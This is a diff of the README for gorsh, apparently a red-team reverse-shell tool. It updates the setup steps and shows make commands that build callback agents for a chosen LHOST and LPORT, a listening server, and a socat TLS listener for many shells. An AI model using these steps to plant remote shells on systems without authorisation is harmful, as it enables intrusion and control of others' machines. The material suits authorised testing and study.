@@ -15,7 +15,7 @@ Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershel
 
 ## Fork Changes
 
-**Requires go1.11+**
+**Requires go1.16+**
 
 See the [Changelog](./docs/CHANGELOG.md)
 
@@ -25,32 +25,23 @@ See the [Changelog](./docs/CHANGELOG.md)
 git clone git@github.com:audibleblink/gorsh.git
 ```
 
-**Be sure to read the Makefile**. It gives you a good idea of what's going on.
-
 Using the zstd build tag and windll make target require cgo.
 Make sure you're familiar with cross-compilation and cgo and have the toolchains for it, or read
 [here](./docs/TROUBLESHOOTING.md) if you're feeling adventurous.
 
 ### Usage
 
-First, generate your certs and ssh keys for the reverse proxy.
-
-```bash
-$ make depends
-```
+**Create** `internal/sshocks/conf/ssh.json`. There's an example in that same directory for
+reference.
 
 Follow the make command's printed instructions on creating an ssh user for the reverse proxy
 connection.
-
-**Create** `configs/ssh.json`. There's an example json file the `configs` directory.
-
-**RUN** `go generate` to generate code from static assets that will be embedded in the binary
 
 Generate agents with:
 
 ```bash
 # For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
-$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
+$ make {windows,macos,linux} LHOST=example.com LPORT=443
 ```
 
 #### Enumeration Scripts
@@ -75,11 +66,11 @@ Generate the server with:
 
 ```sh
 make server
-build/srv/gorsh-listen --help
+build/srv/gorsh-server --help
 ```
 
-The gorsh-listener is a one-to-one relationship, like a traditional shell. For multiple shells, you
-need to start multiple servers on different ports. 
+The gorsh and gorsh-server have a one-to-one relationship, like a traditional shell. For multiple
+shells, you need to start multiple servers on different ports. Unless...
 
 To have the ability to receive multiple shells on the same port, there's the `make listen` target.
 The `make listen` target kicks off a socat TLS pipe and creates new tmux windows with each new
